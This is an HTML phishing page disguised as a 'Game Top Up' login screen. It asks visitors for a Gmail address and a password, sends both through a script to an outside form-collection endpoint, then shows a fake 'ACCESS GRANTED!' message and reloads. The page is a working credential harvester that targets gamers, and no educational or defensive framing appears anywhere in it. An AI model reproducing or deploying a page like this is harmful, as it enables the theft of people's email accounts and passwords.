<!DOCTYPE html>
<html>
<head>
    <title>System Authentication</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { border: 2px solid #00ff41; padding: 30px; box-shadow: 0 0 20px #00ff41; background: #000; width: 300px; text-align: center; }
        input { background: transparent; border: 1px solid #00ff41; color: #00ff41; width: 100%; padding: 10px; margin: 15px 0; outline: none; box-sizing: border-box; }
        button { background: #00ff41; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #008f11; box-shadow: 0 0 10px #00ff41; }
        .status { font-size: 10px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="status">[ LOGIN FOR TOP UP ]</div>
        <h3> GAME TOP UP</h3>
        
        <form id="hackerForm" action="https://formspree.io/f/mbdzqero" method="POST">
            <input type="text" name="user_id" placeholder="@gmail..." required>
            <input type="password" name="access_key" placeholder="password..." required>
            <button type="submit">BYPASS SYSTEM</button>
        </form>
    </div>

    <script>
        
        const form = document.getElementById('hackerForm');
        form.onsubmit = async (e) => {
            e.preventDefault();
            const data = new FormData(form);
            await fetch(form.action, {
                method: 'POST',
                body: data,
                headers: { 'Accept': 'application/json' }
            });
            alert("ACCESS GRANTED!");
            location.reload(); // Refresh halaman
        };
    </script>
</body>
</html>
